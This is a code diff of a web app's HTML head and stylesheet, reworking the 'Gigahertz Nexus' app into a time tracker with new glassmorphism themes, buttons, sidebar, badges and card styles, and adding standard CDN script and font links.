@@ -1,479 +1,1009 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="gigahertz">
+<html lang="en" data-theme="classic">
 <head>
 <meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover"/>
-<title>Gigahertz Nexus — Ultimate Edition</title>
-
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Gigahertz Nexus — Time Tracker v5.99</title>
+<link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRurHiRjhAqL8xPFzjXHWgjpxNtpGagJSOG7A&s"/>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&family=Rajdhani:wght@500;600;700&family=Exo+2:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.2/babel.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet"/>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.min.js"></script>
 <style>
-/* ============================================================
-   THEME SYSTEM — INCLUDING THE NEW BLUE/WHITE GIGAHERTZ
-============================================================ */
-:root {
-  --p:#00a8ff; --pd:#0072ff; --pl:#e6f7ff;
-  --bg: linear-gradient(135deg, #e0e5ec 0%, #e0e5ec 100%);
-  --solid-bg: #e0e5ec;
-  --wh:#e0e5ec; --card: rgba(255,255,255,0.4);
-  --tx:#2d3436; --tx2:#4a5270; --tx3:#8890aa;
-  --bd:rgba(255,255,255,0.4); --danger:#ef4444; --ok:#22c55e; --warn:#f59e0b;
-  --neo-sh1: 9px 9px 16px rgb(163,177,198,0.6);
-  --neo-sh2: -9px -9px 16px rgba(255,255,255, 0.5);
-  --neo-in1: inset 6px 6px 10px 0 rgba(163,177,198, 0.5);
-  --neo-in2: inset -6px -6px 10px 0 rgba(255,255,255, 0.8);
-  --glass-bg:rgba(255,255,255,0.45); --glass-border:rgba(255,255,255,0.8);
-  --shadow: rgba(0,0,0,0.1);
+:root,[data-theme="classic"]{
+  --p:#1a56db;--pd:#1344b8;--ps:#e8f0fe;--pa:rgba(26,86,219,0.12);
+  --bg1:#dce8ff;--bg2:#ecd6fa;--bg3:#c8dcff;
+  --gb:rgba(255,255,255,0.62);--gb2:rgba(255,255,255,0.82);
+  --gbd:rgba(255,255,255,0.75);--gbh:rgba(26,86,219,0.07);
+  --tx:#0b1837;--tx2:#2e4080;--tx3:#6b7eb8;--tx4:#a0aed4;
+  --bd:rgba(26,86,219,0.13);--bd2:rgba(26,86,219,0.22);
+  --sh:0 4px 28px rgba(26,86,219,0.10);--shl:0 12px 50px rgba(26,86,219,0.18);
+  --r:16px;--rsm:10px;--rlg:22px;--rxl:28px;
+  --ok:#16a34a;--warn:#d97706;--danger:#dc2626;
+  --dl:rgba(220,38,38,0.08);--wl:rgba(217,119,6,0.08);
+  --ibg:rgba(255,255,255,0.85);--ibgf:rgba(255,255,255,0.95);
 }
-
-/* FIXED GIGAHERTZ THEME: Gradient Blue and White, NO YELLOW */
-[data-theme="gigahertz"] { 
-  --p: #1a73e8; 
-  --pd: #1557b0; 
-  --bg: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%); 
-  --solid-bg: #e6ebf2; 
-  --wh: #ffffff; 
-  --card: rgba(255, 255, 255, 0.5); 
-  --tx: #0f172a; --tx2: #334155; --tx3: #64748b; 
-  --bd: rgba(255, 255, 255, 0.8); 
-  --neo-sh1: 9px 9px 16px rgba(163, 177, 198, 0.6); 
-  --neo-sh2: -9px -9px 16px rgba(255, 255, 255, 0.9); 
-  --neo-in1: inset 6px 6px 10px 0 rgba(163, 177, 198, 0.5); 
-  --neo-in2: inset -6px -6px 10px 0 rgba(255, 255, 255, 0.9); 
-  --glass-bg: rgba(255, 255, 255, 0.55); 
-  --glass-border: rgba(255, 255, 255, 0.9); 
-  --shadow: rgba(26, 115, 232, 0.15); 
+[data-theme="midnight"]{
+  --p:#5b8ef7;--pd:#3d6fe0;--ps:rgba(91,142,247,0.15);--pa:rgba(91,142,247,0.12);
+  --bg1:#080f22;--bg2:#100820;--bg3:#060d1e;
+  --gb:rgba(14,22,50,0.72);--gb2:rgba(18,28,62,0.88);
+  --gbd:rgba(20,32,70,0.82);--gbh:rgba(91,142,247,0.08);
+  --tx:#d8e4ff;--tx2:#8aa4e8;--tx3:#4e6aaa;--tx4:#2e4070;
+  --bd:rgba(91,142,247,0.15);--bd2:rgba(91,142,247,0.28);
+  --sh:0 4px 28px rgba(0,0,0,0.45);--shl:0 12px 50px rgba(0,0,0,0.65);
+  --ok:#4ade80;--warn:#fbbf24;--danger:#f87171;
+  --dl:rgba(248,113,113,0.12);--wl:rgba(251,191,36,0.1);
+  --ibg:rgba(14,22,50,0.8);--ibgf:rgba(18,28,62,0.92);
 }
-
-[data-theme="dark"] { --p:#3b82f6; --pd:#2563eb; --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); --solid-bg: #1e293b; --wh:#1e293b; --card:rgba(30,41,59,0.6); --tx:#f8fafc; --tx2:#cbd5e1; --tx3:#94a3b8; --bd:rgba(255,255,255,0.1); --neo-sh1: 9px 9px 16px rgba(0,0,0,0.6); --neo-sh2: -9px -9px 16px rgba(255,255,255, 0.03); --neo-in1: inset 6px 6px 10px 0 rgba(0,0,0, 0.6); --neo-in2: inset -6px -6px 10px 0 rgba(255,255,255, 0.03); --glass-bg:rgba(30,41,59,0.55); --glass-border:rgba(255,255,255,0.15); --shadow: rgba(0,0,0,0.4); }
-[data-theme="candy"] { --p:#ec4899; --pd:#db2777; --bg: linear-gradient(135deg, #fdf2f8 0%, #fbcfe8 100%); --solid-bg: #fce7f3; --wh:#ffffff; --card:rgba(255,255,255,0.6); --tx:#831843; --tx2:#9d174d; --tx3:#be185d; --bd:rgba(255,255,255,0.6); --neo-sh1: 9px 9px 16px rgba(236,72,153,0.2); --neo-sh2: -9px -9px 16px rgba(255,255,255, 0.9); --neo-in1: inset 6px 6px 10px 0 rgba(236,72,153, 0.2); --neo-in2: inset -6px -6px 10px 0 rgba(255,255,255, 0.9); --glass-bg:rgba(255,255,255,0.6); --glass-border:rgba(255,255,255,0.9); --shadow: rgba(236,72,153,0.2); }
-[data-theme="void"] { --p:#06b6d4; --pd:#0891b2; --bg: linear-gradient(135deg, #000000 0%, #0a0a0a 100%); --solid-bg: #0a0a0a; --wh:#0a0a0a; --card:rgba(10,10,10,0.6); --tx:#f8fafc; --tx2:#cbd5e1; --tx3:#94a3b8; --bd:rgba(6,182,212,0.3); --neo-sh1: 9px 9px 16px rgba(0,0,0,0.8); --neo-sh2: -9px -9px 16px rgba(6,182,212, 0.1); --neo-in1: inset 6px 6px 10px 0 rgba(0,0,0, 0.8); --neo-in2: inset -6px -6px 10px 0 rgba(6,182,212, 0.1); --glass-bg:rgba(5,5,5,0.7); --glass-border:rgba(6,182,212,0.4); --shadow: rgba(6,182,212,0.3); }
-[data-theme="matrix"] { --p:#22c55e; --pd:#16a34a; --bg: linear-gradient(135deg, #051105 0%, #0a1c0a 100%); --solid-bg: #0a1c0a; --wh:#0a1c0a; --card:rgba(10,28,10,0.8); --tx:#4ade80; --tx2:#86efac; --tx3:#bbf7d0; --bd:rgba(34,197,94,0.4); --neo-sh1: 9px 9px 16px rgba(0,0,0,0.8); --neo-sh2: -9px -9px 16px rgba(34,197,94, 0.1); --neo-in1: inset 6px 6px 10px 0 rgba(0,0,0, 0.8); --neo-in2: inset -6px -6px 10px 0 rgba(34,197,94, 0.1); --glass-bg:rgba(10,28,10,0.6); --glass-border:rgba(34,197,94,0.3); --shadow: rgba(34,197,94,0.3); }
-
+[data-theme="sapphire"]{
+  --p:#00b4ff;--pd:#0090d4;--ps:rgba(0,180,255,0.13);--pa:rgba(0,180,255,0.10);
+  --bg1:#030e1a;--bg2:#040c22;--bg3:#021018;
+  --gb:rgba(4,18,38,0.70);--gb2:rgba(5,22,46,0.86);
+  --gbd:rgba(6,24,50,0.80);--gbh:rgba(0,180,255,0.08);
+  --tx:#c2eeff;--tx2:#5db8e0;--tx3:#2a7099;--tx4:#144460;
+  --bd:rgba(0,180,255,0.16);--bd2:rgba(0,180,255,0.30);
+  --sh:0 4px 28px rgba(0,0,0,0.5);--shl:0 12px 50px rgba(0,180,255,0.18);
+  --ok:#34d399;--warn:#fbbf24;--danger:#f87171;
+  --dl:rgba(248,113,113,0.12);--wl:rgba(251,191,36,0.1);
+  --ibg:rgba(4,18,38,0.78);--ibgf:rgba(5,22,46,0.90);
+}
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Plus Jakarta Sans',system-ui,sans-serif;background:var(--bg);color:var(--tx);min-height:100vh;transition:all .3s ease;overflow-x:hidden;}
-input,select,button,textarea{font-family:inherit;outline:none;border:none;}
-::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--p);opacity:.5;border-radius:99px}
+html{scroll-behavior:smooth}
+body{
+  font-family:'Plus Jakarta Sans',system-ui,sans-serif;
+  background:var(--bg1);color:var(--tx);min-height:100vh;
+  overflow-x:hidden;transition:background .35s,color .35s;
+}
+body::before{
+  content:'';position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(ellipse 80% 70% at 80% 90%,rgba(255,255,255,0.55) 0%,transparent 60%),
+    radial-gradient(ellipse 60% 50% at 20% 90%,rgba(255,255,255,0.35) 0%,transparent 55%),
+    radial-gradient(ellipse 70% 60% at 85% 15%,rgba(147,51,234,0.18) 0%,transparent 55%),
+    radial-gradient(ellipse 60% 55% at 10% 25%,rgba(26,86,219,0.2) 0%,transparent 55%),
+    linear-gradient(135deg,var(--bg1) 0%,var(--bg2) 45%,var(--bg3) 100%);
+  pointer-events:none;transition:background .35s;
+}
+[data-theme="midnight"] body::before,[data-theme="sapphire"] body::before{opacity:1}
+input,select,textarea,button{font-family:inherit}
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--bd2);border-radius:99px}
+::selection{background:var(--ps);color:var(--p)}
 
-/* ============================================================
-   NEUMORPHIC LOGIN UI (Image Accurate)
-============================================================ */
-.auth-wrap {
-  min-height:100vh;display:flex;align-items:center;justify-content:center;
-  background:var(--solid-bg); padding:20px; transition: background .3s;
+.glass{
+  background:var(--gb);
+  backdrop-filter:blur(24px) saturate(1.6);
+  -webkit-backdrop-filter:blur(24px) saturate(1.6);
+  border:1px solid var(--gbd);
+  border-top:1px solid rgba(255,255,255,0.55);
+  box-shadow:var(--sh),inset 0 1px 0 rgba(255,255,255,0.35);
+  transition:box-shadow .3s,transform .3s;
 }
-.neo-card {
-  background:var(--solid-bg);
-  border-radius: 24px;
-  padding: 70px 40px 40px;
-  width: 100%; max-width: 420px;
-  position: relative;
-  box-shadow: var(--neo-sh1), var(--neo-sh2);
-  display: flex; flex-direction: column; align-items: center;
-  transition: all .3s ease;
-}
-.neo-avatar {
-  width: 90px; height: 90px;
-  background: var(--p);
-  border-radius: 50%;
-  position: absolute;
-  top: -45px;
-  left: 50%;
-  transform: translateX(-50%);
-  display: flex; align-items: center; justify-content: center;
-  box-shadow: 0 10px 20px var(--shadow);
-  border: 6px solid var(--solid-bg);
-  color: #fff; font-size: 40px;
-  transition: all .3s;
-}
-.neo-title {
-  font-size: 20px; font-weight: 700; color: var(--tx2);
-  margin-bottom: 30px; text-align: center;
-}
-.neo-input-wrap { width: 100%; margin-bottom: 24px; }
-.neo-input {
-  width: 100%;
-  padding: 16px 24px;
-  border-radius: 50px;
-  background: var(--solid-bg);
-  color: var(--tx);
-  font-size: 14px; font-weight: 600;
-  box-shadow: var(--neo-in1), var(--neo-in2);
-  transition: all 0.2s ease;
-}
-.neo-input:focus { box-shadow: inset 8px 8px 12px 0 rgba(0,0,0,0.1), inset -8px -8px 12px 0 rgba(255,255,255,0.5); }
-.neo-input::placeholder { color: var(--tx3); font-weight: 500; }
-
-.neo-btn {
-  width: 100%;
-  padding: 16px;
-  border-radius: 50px;
-  background: var(--p);
-  color: #fff;
-  font-size: 16px; font-weight: 700;
-  cursor: pointer;
-  box-shadow: 4px 4px 10px var(--shadow), -4px -4px 10px rgba(255,255,255,0.1);
-  transition: all 0.2s ease;
-  margin-top: 10px;
-}
-.neo-btn:active { box-shadow: inset 4px 4px 10px rgba(0,0,0,0.2); transform: translateY(2px); }
-
-.neo-link {
-  font-size: 13px; color: var(--tx3); font-weight: 600;
-  margin-top: 24px; cursor: pointer; transition: color 0.2s;
-}
-.neo-link:hover { color: var(--p); }
-
-/* ============================================================
-   GLASSMORPHISM DASHBOARD LAYOUT
-============================================================ */
-.layout { display:flex; min-height:100vh; position:relative; background: var(--bg); transition: background .3s; }
-
-/* Aero Glass Classes */
-.glass {
-  background: var(--glass-bg);
-  backdrop-filter: blur(20px) saturate(180%);
-  -webkit-backdrop-filter: blur(20px) saturate(180%);
-  border: 1px solid var(--glass-border);
-  box-shadow: 0 10px 30px var(--shadow);
+.glass2{
+  background:var(--gb2);
+  backdrop-filter:blur(32px) saturate(1.8);
+  -webkit-backdrop-filter:blur(32px) saturate(1.8);
+  border:1px solid var(--gbd);
+  border-top:1px solid rgba(255,255,255,0.6);
+  box-shadow:var(--shl),inset 0 1px 0 rgba(255,255,255,0.4);
 }
 
-.sidebar {
-  width:280px; height:100vh; 
-  position:fixed; top:0; left:0; z-index:100;
-  display:flex; flex-direction:column; transition:transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-  border-right: 1px solid var(--glass-border);
-}
-.main {
-  margin-left:280px; flex:1; min-height:100vh; padding:32px 40px;
-  display:flex; flex-direction:column; gap:24px; transition:margin 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:7px;padding:11px 22px;border-radius:var(--rsm);border:none;cursor:pointer;font-size:14px;font-weight:700;transition:all .2s cubic-bezier(.16,1,.3,1);white-space:nowrap}
+.btn-p{background:linear-gradient(180deg,var(--p),var(--pd));color:#fff;box-shadow:0 4px 16px rgba(26,86,219,.25),inset 0 1px 0 rgba(255,255,255,.25);}
+.btn-p:hover{filter:brightness(1.1);transform:translateY(-2px);box-shadow:0 8px 24px rgba(26,86,219,.35),inset 0 1px 0 rgba(255,255,255,.3);}
+.btn-p:active{transform:translateY(0)}
+.btn-p:disabled{opacity:.55;cursor:not-allowed;transform:none;box-shadow:none}
+.btn-ghost{background:rgba(255,255,255,0.08);color:var(--tx2);border:1px solid var(--bd2)}
+.btn-ghost:hover{background:rgba(255,255,255,0.18);color:var(--tx);border-color:var(--p)}
+.btn-danger{background:rgba(220,38,38,.1);color:var(--danger);border:1px solid rgba(220,38,38,.25)}
+.btn-danger:hover{background:var(--danger);color:#fff}
+.btn-ok{background:rgba(22,163,74,.1);color:var(--ok);border:1px solid rgba(22,163,74,.25)}
+.btn-ok:hover{background:var(--ok);color:#fff}
+.btn-sm{padding:7px 14px;font-size:12px;border-radius:8px}
+.btn-icon{width:36px;height:36px;padding:0;border-radius:10px}
 
-.glass-box {
-  background: var(--glass-bg); border-radius: 24px; padding: 28px;
-  backdrop-filter: blur(20px); border: 1px solid var(--glass-border);
-  box-shadow: 0 10px 30px var(--shadow); transition: transform .3s;
+.input{
+  width:100%;padding:11px 15px;
+  background:var(--ibg);border:1.5px solid var(--bd2);
+  border-radius:var(--rsm);font-size:14px;color:var(--tx);
+  outline:none;transition:all .2s;font-weight:500;
+  backdrop-filter:blur(10px);
 }
-.glass-box:hover { transform: translateY(-4px); }
+.input:focus{border-color:var(--p);background:var(--ibgf);box-shadow:0 0 0 4px var(--pa)}
+.input::placeholder{color:var(--tx4)}
+select.input{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%236b7eb8' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:36px}
+.input-label{display:block;font-size:11px;font-weight:800;color:var(--tx3);margin-bottom:6px;text-transform:uppercase;letter-spacing:.07em}
 
-/* Sidebar Nav */
-.nav-item {
-  display:flex; align-items:center; gap:16px; padding:16px 24px;
-  color:var(--tx2); font-weight:800; font-size:14px; cursor:pointer;
-  border-radius: 16px; margin: 0 16px 8px; transition: all 0.3s;
-}
-.nav-item:hover { background: rgba(255,255,255,0.1); color: var(--tx); transform: translateX(4px); }
-.nav-item.active {
-  background: linear-gradient(135deg, color-mix(in srgb, var(--p) 20%, transparent), color-mix(in srgb, var(--pd) 10%, transparent));
-  color: var(--tx); border: 1px solid color-mix(in srgb, var(--p) 30%, transparent);
-}
-.nav-icon {
-  width: 36px; height: 36px; border-radius: 12px; display: flex; align-items: center; justify-content: center;
-  background: rgba(255,255,255,0.1); font-size: 16px; transition: all .3s;
-}
-.nav-item.active .nav-icon { background: linear-gradient(180deg, var(--p), var(--pd)); color: #fff; box-shadow: 0 4px 12px var(--shadow); }
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
+@keyframes slideLeft{from{opacity:0;transform:translateX(22px)}to{opacity:1;transform:translateX(0)}}
+@keyframes popIn{from{transform:scale(.88);opacity:0}to{transform:scale(1);opacity:1}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.45}}
+@keyframes orb1{0%{transform:translate(0,0) scale(1)}50%{transform:translate(6vw,8vh) scale(1.12)}100%{transform:translate(-4vw,-4vh) scale(.92)}}
+@keyframes orb2{0%{transform:translate(0,0) scale(1)}50%{transform:translate(-8vw,5vh) scale(.9)}100%{transform:translate(5vw,-6vh) scale(1.1)}}
 
-/* Elements */
-.glass-btn {
-  padding: 12px 24px; border-radius: 14px; font-weight: 800; font-size: 13px;
-  background: linear-gradient(180deg, var(--p), var(--pd)); color: #fff;
-  box-shadow: 0 4px 16px var(--shadow), inset 0 1px 1px rgba(255,255,255,0.3);
-  cursor: pointer; transition: all .3s;
-}
-.glass-btn:hover { filter: brightness(1.15); transform: translateY(-2px); }
-.glass-input {
-  width: 100%; padding: 14px 18px; border-radius: 14px;
-  background: rgba(0,0,0,0.05); border: 1.5px solid var(--bd);
-  color: var(--tx); font-weight: 600; font-size: 14px; transition: all .3s;
-}
-.glass-input:focus { border-color: var(--p); background: rgba(0,0,0,0.1); transform: translateY(-1px); }
-select.glass-input option { background: var(--solid-bg); color: var(--tx); }
+.anim-fade{animation:fadeUp .5s cubic-bezier(.16,1,.3,1) both}
+.anim-pop{animation:popIn .4s cubic-bezier(.34,1.56,.64,1) both}
+.anim-slide{animation:slideLeft .4s cubic-bezier(.16,1,.3,1) both}
+.spinner{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:spin .65s linear infinite;display:inline-block}
+.spinner-p{width:18px;height:18px;border:2.5px solid var(--ps);border-top-color:var(--p);border-radius:50%;animation:spin .65s linear infinite;display:inline-block}
 
-.gh-table { width:100%; border-collapse:collapse; text-align:left; }
-.gh-table th { padding:16px; font-size:11px; font-weight: 900; color:var(--tx3); text-transform:uppercase; border-bottom: 2px solid var(--bd); }
-.gh-table td { padding:16px; font-size:14px; font-weight:700; border-bottom: 1px solid var(--bd); }
+.orbs-bg{position:fixed;inset:0;z-index:-1;overflow:hidden;pointer-events:none}
+.orb{position:absolute;border-radius:50%;filter:blur(90px);opacity:.45}
+.orb1{width:55vw;height:55vw;background:var(--bg2);top:-20vw;left:-10vw;animation:orb1 28s ease-in-out infinite alternate}
+.orb2{width:48vw;height:48vw;background:var(--bg3);bottom:-15vw;right:-12vw;animation:orb2 22s ease-in-out infinite alternate}
 
-.timer-display { font-size: 56px; font-weight: 900; color: var(--p); font-family: monospace; line-height: 1; margin: 16px 0; text-shadow: 0 2px 10px var(--shadow); }
+.badge{display:inline-flex;align-items:center;gap:5px;padding:3px 11px;border-radius:99px;font-size:10.5px;font-weight:800;text-transform:uppercase;letter-spacing:.07em}
+.badge-active{background:rgba(22,163,74,.15);color:var(--ok);border:1px solid rgba(22,163,74,.3)}
+.badge-idle{background:rgba(217,119,6,.15);color:var(--warn);border:1px solid rgba(217,119,6,.3)}
+.badge-absent{background:rgba(220,38,38,.12);color:var(--danger);border:1px solid rgba(220,38,38,.25)}
+.badge-admin{background:rgba(26,86,219,.15);color:var(--p);border:1px solid rgba(26,86,219,.3)}
+.live-dot{width:7px;height:7px;border-radius:50%;background:var(--ok);animation:pulse 1.4s ease infinite}
 
-/* Mobile Nav */
-@media (max-width: 768px) {
-  .sidebar { transform: translateX(-100%); }
-  .main { margin-left: 0; padding: 20px; padding-bottom: 100px; }
-  .mobile-nav {
-    display: flex; position: fixed; bottom: 0; left: 0; right: 0;
-    background: var(--glass-bg); backdrop-filter: blur(20px); border-top: 1px solid var(--glass-border);
-    padding: 12px; box-shadow: 0 -10px 40px var(--shadow); z-index: 200;
-    justify-content: space-around;
-  }
-  .mob-nav-btn {
-    display: flex; flex-direction: column; align-items: center; gap: 6px;
-    font-size: 10px; font-weight: 900; text-transform: uppercase; color: var(--tx3); transition: all .3s;
-  }
-  .mob-nav-btn.active { color: var(--tx); }
-  .mob-icon { width: 44px; height: 44px; border-radius: 14px; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.05); font-size: 18px; transition: all .3s;}
-  .mob-nav-btn.active .mob-icon { background: linear-gradient(180deg, var(--p), var(--pd)); color: #fff; transform: translateY(-4px); box-shadow: 0 4px 12px var(--shadow); }
+.layout{display:flex;min-height:100vh}
+.sidebar{
+  width:265px;height:100vh;position:fixed;top:0;left:0;z-index:200;
+  display:flex;flex-direction:column;
+  background:var(--gb2);
+  backdrop-filter:blur(32px) saturate(1.8);
+  -webkit-backdrop-filter:blur(32px) saturate(1.8);
+  border-right:1px solid var(--gbd);
+  box-shadow:4px 0 32px rgba(26,86,219,.1),inset -1px 0 0 rgba(255,255,255,.15);
+  transition:transform .35s cubic-bezier(.16,1,.3,1);
 }
-@media (min-width: 769px) { .mobile-nav { display: none; } }
+.sidebar-logo{padding:22px 20px 14px;border-bottom:1px solid var(--bd)}
+.sidebar-logo img{height:44px;object-fit:contain;max-width:100%}
+.sidebar-logo-tagline{font-size:9.5px;font-weight:800;color:var(--tx3);text-transform:uppercase;letter-spacing:.12em;margin-top:5px}
+.sb-nav{flex:1;padding:16px 12px;display:flex;flex-direction:column;gap:4px;overflow-y:auto}
+.sb-nav::-webkit-scrollbar{width:4px}
+.nav-btn{
+  display:flex;align-items:center;gap:13px;padding:11px 14px;
+  border-radius:13px;cursor:pointer;border:1px solid transparent;
+  font-size:14px;font-weight:600;color:var(--tx2);background:transparent;
+  width:100%;text-align:left;transition:all .2s;
+}
+.nav-btn:hover{background:var(--gbh);color:var(--tx);border-color:var(--bd)}
+.nav-btn.active{background:var(--pa);color:var(--p);border-color:var(--bd2);font-weight:700}
+.nav-btn svg{width:18px;height:18px;flex-shrink:0;stroke-width:2.2}
+.nav-btn .nav-badge{background:var(--danger);color:#fff;font-size:10px;font-weight:900;border-radius:99px;padding:1px 7px;margin-left:auto}
+.sb-bottom{padding:14px 12px;border-top:1px solid var(--bd);display:flex;flex-direction:column;gap:8px}
+.sb-user{display:flex;align-items:center;gap:11px;padding:12px 14px;border-radius:13px;background:var(--pa);border:1px solid var(--bd2)}
+.sb-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--p),var(--pd));display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#fff;flex-shrink:0;overflow:hidden}
+.sb-avatar img{width:100%;height:100%;object-fit:cover}
+.sb-user-name{font-size:13px;font-weight:800;color:var(--tx);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.sb-user-role{font-size:10px;font-weight:700;color:var(--tx3);text-transform:uppercase;letter-spacing:.06em}
+.logout-btn{display:flex;align-items:center;justify-content:center;gap:9px;padding:11px;border-radius:13px;background:var(--pa);border:1px solid var(--bd2);color:var(--p);font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;width:100%}
+.logout-btn:hover{background:var(--danger);border-color:var(--danger);color:#fff}
+.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:190;backdrop-filter:blur(3px)}
+
+.main{margin-left:265px;flex:1;display:flex;flex-direction:column;min-height:100vh}
+.topbar{
+  position:sticky;top:0;z-index:100;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 32px;gap:14px;
+  background:var(--gb);backdrop-filter:blur(24px) saturate(1.6);
+  -webkit-backdrop-filter:blur(24px) saturate(1.6);
+  border-bottom:1px solid var(--gbd);
+  box-shadow:0 2px 16px rgba(26,86,219,.07);
+}
+.topbar-left{display:flex;align-items:center;gap:12px}
+.menu-toggle{display:none;background:transparent;border:1px solid var(--bd2);color:var(--tx);padding:8px 10px;border-radius:9px;cursor:pointer;font-size:17px}
+.topbar-title{font-size:20px;font-weight:800;color:var(--tx);letter-spacing:-.3px}
+.topbar-right{display:flex;align-items:center;gap:10px}
+.topbar-btn{position:relative;background:var(--pa);border:1px solid var(--bd2);color:var(--tx2);width:38px;height:38px;border-radius:11px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px;transition:all .2s}
+.topbar-btn:hover{background:var(--ps);color:var(--p);border-color:var(--p)}
+.topbar-btn .tb-notif{position:absolute;top:-4px;right:-4px;background:var(--danger);color:#fff;width:17px;height:17px;border-radius:50%;font-size:9px;font-weight:900;display:flex;align-items:center;justify-content:center}
+.settings-dropdown{
+  position:absolute;top:calc(100% + 10px);right:0;
+  width:280px;border-radius:18px;padding:6px;
+  background:var(--gb2);backdrop-filter:blur(32px) saturate(1.8);
+  -webkit-backdrop-filter:blur(32px) saturate(1.8);
+  border:1px solid var(--gbd);border-top:1px solid rgba(255,255,255,.55);
+  box-shadow:var(--shl);z-index:500;
+  animation:popIn .25s cubic-bezier(.34,1.56,.64,1);
+}
+.theme-opt{display:flex;align-items:center;gap:13px;padding:11px 14px;border-radius:13px;cursor:pointer;border:1px solid transparent;transition:all .2s}
+.theme-opt:hover{background:var(--gbh);border-color:var(--bd)}
+.theme-opt.active{background:var(--pa);border-color:var(--bd2)}
+.theme-swatch{width:26px;height:26px;border-radius:8px;flex-shrink:0;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+.theme-name{font-size:13px;font-weight:700;color:var(--tx)}
+.theme-desc{font-size:10.5px;color:var(--tx3);font-weight:500}
+.settings-divider{height:1px;background:var(--bd);margin:4px 8px}
+.settings-action{display:flex;align-items:center;gap:11px;padding:10px 14px;border-radius:11px;cursor:pointer;font-size:13.5px;font-weight:600;color:var(--tx2);border:none;background:transparent;width:100%;transition:all .2s}
+.settings-action:hover{background:var(--gbh);color:var(--tx)}
+.settings-action svg{width:17px;height:17px;stroke-width:2.2;flex-shrink:0}
+
+.page{padding:28px 32px;flex:1}
+.page-hdr{margin-bottom:22px}
+.page-title{font-size:26px;font-weight:900;color:var(--tx);letter-spacing:-.5px}
+.page-sub{font-size:13px;color:var(--tx3);margin-top:3px;font-weight:500}
+
+.card{background:var(--gb);backdrop-filter:blur(24px) saturate(1.6);-webkit-backdrop-filter:blur(24px) saturate(1.6);border:1px solid var(--gbd);border-top:1px solid rgba(255,255,255,.5);border-radius:var(--rlg);box-shadow:var(--sh);transition:transform .25s,box-shadow .25s}
+.card:hover{transform:translateY(-3px);box-shadow:var(--shl)}
+.card-inner{background:var(--ibg);border:1px solid var(--bd);border-radius:var(--r);padding:18px 20px}
+
+.stat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:22px}
+.stat-card{padding:20px 22px}
+.stat-icon{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;margin-bottom:14px}
+.stat-lbl{font-size:11px;font-weight:800;color:var(--tx3);text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px}
+.stat-val{font-size:30px;font-weight:900;color:var(--p);letter-spacing:-1px;line-height:1}
+.stat-sub{font-size:11.5px;color:var(--tx3);margin-top:7px;font-weight:500}
+.stat-clock{font-size:28px;font-weight:900;color:var(--p);font-variant-numeric:tabular-nums;letter-spacing:-.5px;line-height:1}
+
+.track-card{padding:22px 24px}
+.track-title{font-size:15px;font-weight:800;color:var(--tx);margin-bottom:4px}
+.track-sub{font-size:12.5px;color:var(--tx3);margin-bottom:16px}
+.track-select{width:100%;padding:11px 15px;background:var(--ibg);border:1.5px solid var(--bd2);border-radius:var(--rsm);font-size:14px;color:var(--tx);outline:none;cursor:pointer;appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%236b7eb8' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;padding-right:36px;font-weight:500;transition:.2s}
+.track-select:focus{border-color:var(--p);box-shadow:0 0 0 4px var(--pa)}
